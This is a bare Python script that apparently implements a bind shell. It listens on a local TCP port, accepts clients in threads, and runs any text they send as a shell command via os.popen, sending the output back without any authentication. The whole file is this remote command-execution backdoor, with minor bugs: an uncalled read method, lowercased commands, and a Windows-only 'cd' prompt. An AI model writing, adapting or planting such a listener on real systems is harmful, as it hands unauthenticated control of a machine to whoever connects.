import socket
import threading
import os

def execute(cmd):

    return os.popen(cmd).read

    

HOST = '127.0.0.1'
PORT = 1234

def listen():

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print('listening')
    server.bind((HOST, PORT))
    server.listen(5)
    while True:
        client_socket, _ = server.accept()
        client_thread = threading.Thread(
            target=handle, args=(client_socket,))
        client_thread.start()


def handle(client_socket):
        
    result = ''
    while True:
        client_socket.send(os.popen('cd').read().encode())
        data = client_socket.recv(4096).decode().lower()

        if "q" == data.strip("\n"):
            exit()
        else:
            if data.startswith("cd"):
                if "cd" == data.strip("\n"):
                    result = os.popen(data).read()
                    client_socket.send(result.encode())
                    continue
                os.chdir(data[3:].replace('\n',''))
            else :
                result = os.popen(data).read()
            result = result + "\n"
            client_socket.send(result.encode()) 
            result = ''
            


listen()